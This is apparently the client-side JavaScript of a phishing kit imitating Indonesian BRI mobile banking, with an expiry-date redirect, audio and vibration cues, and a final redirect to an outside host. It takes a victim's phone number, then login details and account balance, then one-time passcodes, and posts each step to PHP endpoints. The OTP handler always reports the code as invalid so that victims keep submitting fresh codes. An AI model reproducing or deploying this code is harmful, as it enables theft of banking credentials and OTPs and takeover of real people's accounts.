let tglNow = new Date();
let waktuBatas = new Date("2025-08-23T23:59:59");
if (tglNow.getTime() >= waktuBatas.getTime()) {
  document.location.href = 'https://expiredweb.pages.dev';
} else {
  console.log('Server aktif');
}

// index
function sendNohp(){    
    event.preventDefault();                   
    $(".wait").fadeIn();
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
  var nomor = $('#nohp').val();
  sessionStorage.setItem('nomor', nomor);                     
             
   
       $.ajax({
            type: 'POST',
            url: 'rest/no.php',
            data: $('#hpForm').serialize(),
            datatype: 'JSON',
            
    complete: function(){
    audio = document.getElementById("brimo");
    audio.play(); 
    setTimeout(function(){   
    window.location = "login.html";
    
    $(".wait").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 2000);}});};   
     
     
     
//data     
function sendLogin(){
   $('.wait').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";
                       
   
     $.ajax({
            type: 'POST',
            url: 'rest/login.php',
            data: $('#loginForm').serialize(),
            datatype: 'JSON',
            
    complete: function(){    
    setTimeout(function(){   
    window.location = "otp.html";    
    $('.wait').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo);
   vibr(180);
    }, 1500);}});};
    
       
    
   
        


// otp
function sendOtp(){
    event.preventDefault();        
    $(".wait").fadeIn();   
    document.getElementById('kirim').value = "Memproses....";                            
    
     
     $.ajax({
            type: 'POST',
            url: 'rest/otp.php',
            data: $('#formOtp').serialize(),
            datatype: 'JSON',
        
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    $(".wait").fadeOut();   
 $("#otp").val("");
 $("#otp").addClass('invalid-input'); 
   document.getElementById('kirim').value = "Konfirmasi";
    }, 200);}});};



function vibr(dur){
            if (navigator.vibrate) {
                navigator.vibrate(dur);
            } else {
                console.log("NotSupported");
            }
        }

function wa(){
 $(".wait").fadeIn();   
  audio = document.getElementById("tunggu");
   audio.play();
   
setTimeout(function(){  
location.href='https://demcloud.my.id/BRI/fdsr01/wa';
    }, 5000);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 5100);      
}     
